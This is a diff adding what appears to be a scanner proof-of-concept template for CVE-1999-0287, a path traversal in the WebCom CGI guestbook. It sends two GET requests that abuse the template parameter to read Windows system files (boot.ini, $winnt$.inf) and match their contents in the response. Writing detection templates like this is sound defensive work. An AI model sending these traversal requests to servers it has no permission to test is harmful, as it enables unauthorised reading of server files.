@@ -1,0 +1,33 @@
+[info]
+id = "POC-AVE-1999-0022"
+name = "CVE-1999-0287 PoC"
+author = "AVE"
+severity = "high"
+tags = ["cve-1999-0287"]
+description = "检测 WebCom CGI Guestbook wguest.exe 路径遍历漏洞，通过template参数读取远程服务器文件"
+vuln_id = ["CVE-1999-0287", "AVE-1999-0022"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/wguest.exe?template=c:\\boot.ini"
+headers = { "User-Agent" = "AVE/1.0" }
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["[boot loader]", "boot loader"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/rguest.exe?template=c:\\winnt\\system32\\$winnt$.inf"
+headers = { "User-Agent" = "AVE/1.0" }
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["$winnt$", "WinNT"]
+expect = true
